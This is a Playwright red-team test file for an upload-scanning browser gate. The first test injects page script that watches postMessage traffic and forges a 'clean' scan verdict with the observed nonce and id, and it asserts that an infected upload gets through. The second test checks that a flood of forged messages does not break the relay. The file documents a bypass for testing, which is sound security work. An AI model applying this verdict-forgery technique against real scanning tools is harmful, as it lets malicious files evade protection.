import { test, expect } from '../fixtures';
import { prepareHostile } from './host';

// RED TEAM — Vector 4: Nonce-cracker / bridge spoofing.
//
// The gate↔bridge nonce is BROADCAST over window.postMessage (bridge-hello), and
// every scan-request carries its id — both observable by the MAIN-world page. A
// hostile page can therefore forge a `scan-verdict{clean}` with the real
// nonce+id and post it straight to the gate, beating the Worker. The gate
// settles 'clean' and releases the infected upload.
//
// (Brute force is NOT the attack — 122-bit UUIDs are unguessable. OBSERVATION is.)

const CH = 'trapguard:gate-bridge:v1';

test('observed-nonce verdict forgery releases an infected upload (BYPASS)', async ({ context }) => {
  const { page, uploadHits } = await prepareHostile(
    context,
    `// Forge a CLEAN verdict the instant we observe the gate's scan-request.
     window.addEventListener('message', (e) => {
       const d = e.data;
       if (!d || d.channel !== '${CH}') return;
       if (d.kind === 'scan-request') {
         window.postMessage(
           { channel: '${CH}', kind: 'scan-verdict', nonce: d.nonce, id: d.id, verdict: 'clean' },
           location.origin,
         );
       }
     });
     window.__run = async () => {
       const fd = new FormData();
       fd.append('file', infectedFile('evil.txt'), 'evil.txt');
       try {
         const r = await fetch('/api/upload', { method: 'POST', body: fd });
         window.__uploadStatus = r.status;
       } catch (e) { window.__uploadError = (e && e.name) || String(e); }
     };`,
  );

  await page.evaluate(() => (window as unknown as { __run: () => Promise<void> }).__run());

  // The infected upload completed because the gate accepted the forged 'clean'.
  await expect
    .poll(() => page.evaluate(() => (window as unknown as { __uploadStatus?: number }).__uploadStatus ?? null), {
      timeout: 10_000,
    })
    .toBe(200);
  expect(uploadHits.length).toBeGreaterThan(0);
});

test('flooding the channel with malformed/forged messages does NOT break the relay (HARDENED)', async ({
  context,
}) => {
  const errors: string[] = [];
  const { page, uploadHits } = await prepareHostile(
    context,
    `window.__flood = () => {
       for (let i = 0; i < 3000; i++) {
         // malformed, wrong-channel, and forged messages with random ids/nonces
         window.postMessage({ junk: i }, location.origin);
         window.postMessage({ channel: 'evil', kind: 'scan-verdict' }, location.origin);
         window.postMessage(
           { channel: '${CH}', kind: 'scan-verdict', nonce: 'x' + i, id: 'y' + i, verdict: 'clean' },
           location.origin,
         );
         window.postMessage({ channel: '${CH}', kind: 'bridge-hello', nonce: 'attacker' + i }, location.origin);
       }
     };
     window.__run = async () => {
       const fd = new FormData();
       fd.append('file', infectedFile('evil.txt'), 'evil.txt');
       fetch('/api/upload', { method: 'POST', body: fd }).catch(() => {});
     };`,
  );
  page.on('pageerror', (e) => errors.push(e.message));

  // Bombard, then perform a NORMAL infected upload (no targeted forgery).
  await page.evaluate(() => (window as unknown as { __flood: () => void }).__flood());
  await page.evaluate(() => (window as unknown as { __run: () => Promise<void> }).__run());

  // The relay survived the flood: the infected file is still caught (overlay
  // shows) and the real upload is HELD (never reached the endpoint yet).
  await expect(page.locator('[data-testid="tg-overlay"]')).toBeVisible({ timeout: 15_000 });
  expect(uploadHits).toEqual([]);
  expect(errors).toEqual([]); // no unhandled page errors from the flood
});
